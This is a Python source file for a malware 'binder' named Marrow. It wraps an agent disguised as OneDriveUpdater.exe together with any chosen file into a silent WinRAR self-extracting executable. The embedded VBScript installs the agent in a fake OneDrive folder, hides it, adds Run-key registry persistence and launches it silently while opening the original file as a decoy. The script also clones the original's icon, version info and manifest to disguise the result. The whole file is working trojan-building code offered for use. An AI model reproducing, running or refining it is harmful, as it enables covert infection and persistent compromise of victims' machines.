"""
Marrow Binder - Final Version
Silent VBS + Full Resource Cloning
"""
import sys
import os
import shutil
import subprocess
import tempfile
import random
import string

BINDER_DIR = os.path.dirname(os.path.abspath(__file__))
AGENT_EXE = os.path.join(BINDER_DIR, "OneDriveUpdater.exe")
WINRAR = r"C:\Program Files (x86)\WinRAR\Rar.exe"
RESOURCE_HACKER = os.path.join(BINDER_DIR, "ResourceHacker.exe")

def random_folder():
    chars = string.ascii_lowercase + string.digits
    name = ''.join(random.choice(chars) for _ in range(8))
    path = os.path.join(tempfile.gettempdir(), f"marrow_{name}")
    os.makedirs(path, exist_ok=True)
    return path

def create_silent_vbs(target_filename):
    # Use raw string with single backslashes for VBS
    vbs = '''On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

ExtractDir = WshShell.ExpandEnvironmentStrings("%TEMP%") & "\\marrow_extract\\"
StealthDir = WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\\Microsoft\\OneDrive\\"
StealthExe = StealthDir & "OneDriveUpdater.exe"
AgentExe = ExtractDir & "OneDriveUpdater.exe"
TargetFile = ExtractDir & "''' + target_filename + '''"

' Create directories
WshShell.Run "cmd /c mkdir """ & StealthDir & """", 0, True
WScript.Sleep 500

' Copy using xcopy (more reliable than copy)
WshShell.Run "cmd /c xcopy /y /q """ & AgentExe & """ """ & StealthDir & """", 0, True
WScript.Sleep 500

' Set attributes
WshShell.Run "cmd /c attrib +h +s """ & StealthExe & """", 0, True

' Registry persistence
WshShell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync", StealthExe, "REG_SZ"

' Run agent
WshShell.Run Chr(34) & StealthExe & Chr(34), 0, False

' Run original
WshShell.Run Chr(34) & TargetFile & Chr(34), 1, False
'''
    return vbs

def bind(target_file):
    print(f"Binding: {target_file}")
    
    if not os.path.exists(target_file):
        print(f"ERROR: File not found: {target_file}")
        return None
    
    if not os.path.exists(WINRAR):
        print(f"ERROR: WinRAR not found")
        return None
    
    target_name = os.path.basename(target_file)
    target_base, target_ext = os.path.splitext(target_name)
    
    output_dir = random_folder()
    work_dir = os.path.join(output_dir, "work")
    os.makedirs(work_dir, exist_ok=True)
    
    # Copy files
    shutil.copy2(AGENT_EXE, os.path.join(work_dir, "OneDriveUpdater.exe"))
    shutil.copy2(target_file, os.path.join(work_dir, target_name))
    
    # Create VBS
    with open(os.path.join(work_dir, "setup.vbs"), 'w') as f:
        f.write(create_silent_vbs(target_name))
    
    # SFX config
    with open(os.path.join(work_dir, "sfx.txt"), 'w') as f:
        f.write("Path=%TEMP%\\marrow_extract\nSetup=wscript.exe setup.vbs\nSilent=1\nOverwrite=1\n")
    
    output_name = target_name if target_ext.lower() == '.exe' else target_base + ".exe"
    output_exe = os.path.join(output_dir, output_name)
    
    # Build SFX
    subprocess.run([WINRAR, "a", "-sfx", f"-z{os.path.join(work_dir, 'sfx.txt')}", "-ep1", output_exe, os.path.join(work_dir, "*")], capture_output=True)
    
    if os.path.exists(output_exe) and target_ext.lower() == '.exe' and os.path.exists(RESOURCE_HACKER):
        print("Cloning icon and version info from original...")
        
        # FIRST: Delete all existing icons from SFX (WinRAR has default icons)
        print("  Removing WinRAR default icons...")
        subprocess.run([RESOURCE_HACKER, "-open", output_exe, "-save", output_exe, "-action", "delete", "-mask", "ICONGROUP,,"], capture_output=True)
        subprocess.run([RESOURCE_HACKER, "-open", output_exe, "-save", output_exe, "-action", "delete", "-mask", "ICON,,"], capture_output=True)
        
        # Try multiple methods to extract icon
        icon_extracted = False
        
        # Method 1: Extract ICONGROUP (most common)
        icon_res = os.path.join(output_dir, "icon.res")
        result = subprocess.run([RESOURCE_HACKER, "-open", target_file, "-save", icon_res, "-action", "extract", "-mask", "ICONGROUP,,"], capture_output=True, text=True)
        if os.path.exists(icon_res) and os.path.getsize(icon_res) > 0:
            # Also extract the actual ICON resources
            icon_data = os.path.join(output_dir, "icondata.res")
            subprocess.run([RESOURCE_HACKER, "-open", target_file, "-save", icon_data, "-action", "extract", "-mask", "ICON,,"], capture_output=True)
            
            # Add ICON data first, then ICONGROUP
            if os.path.exists(icon_data) and os.path.getsize(icon_data) > 0:
                subprocess.run([RESOURCE_HACKER, "-open", output_exe, "-save", output_exe, "-action", "addoverwrite", "-res", icon_data, "-mask", "ICON,,"], capture_output=True)
                os.remove(icon_data)
            
            subprocess.run([RESOURCE_HACKER, "-open", output_exe, "-save", output_exe, "-action", "addoverwrite", "-res", icon_res, "-mask", "ICONGROUP,,"], capture_output=True)
            print(f"  ICONGROUP: Applied ({os.path.getsize(icon_res)} bytes)")
            icon_extracted = True
            os.remove(icon_res)
        
        # Method 2: Also try extracting ICON resources directly
        if not icon_extracted:
            icon_res2 = os.path.join(output_dir, "icon2.res")
            subprocess.run([RESOURCE_HACKER, "-open", target_file, "-save", icon_res2, "-action", "extract", "-mask", "ICON,,"], capture_output=True)
            if os.path.exists(icon_res2) and os.path.getsize(icon_res2) > 0:
                subprocess.run([RESOURCE_HACKER, "-open", output_exe, "-save", output_exe, "-action", "addoverwrite", "-res", icon_res2, "-mask", "ICON,,"], capture_output=True)
                print(f"  ICON: Applied ({os.path.getsize(icon_res2)} bytes)")
                icon_extracted = True
                os.remove(icon_res2)
        
        if not icon_extracted:
            print("  WARNING: Could not extract icon from original")
        
        # Clone VERSION INFO
        ver_res = os.path.join(output_dir, "ver.res")
        subprocess.run([RESOURCE_HACKER, "-open", target_file, "-save", ver_res, "-action", "extract", "-mask", "VERSIONINFO,,"], capture_output=True)
        if os.path.exists(ver_res) and os.path.getsize(ver_res) > 0:
            subprocess.run([RESOURCE_HACKER, "-open", output_exe, "-save", output_exe, "-action", "addoverwrite", "-res", ver_res, "-mask", "VERSIONINFO,,"], capture_output=True)
            print(f"  VERSIONINFO: Applied")
            os.remove(ver_res)
        
        # Clone MANIFEST
        man_res = os.path.join(output_dir, "man.res")
        subprocess.run([RESOURCE_HACKER, "-open", target_file, "-save", man_res, "-action", "extract", "-mask", "MANIFEST,,"], capture_output=True)
        if os.path.exists(man_res) and os.path.getsize(man_res) > 0:
            subprocess.run([RESOURCE_HACKER, "-open", output_exe, "-save", output_exe, "-action", "addoverwrite", "-res", man_res, "-mask", "MANIFEST,,"], capture_output=True)
            print(f"  MANIFEST: Applied")
            os.remove(man_res)
    
    shutil.rmtree(work_dir, ignore_errors=True)
    
    if os.path.exists(output_exe):
        print(f"\nSUCCESS: {output_exe}")
        os.startfile(output_dir)
        return output_exe
    
    print("FAILED")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Right-click any file -> 'Bind with Marrow'")
        sys.exit(1)
    bind(sys.argv[1])
    input("\nPress Enter...")
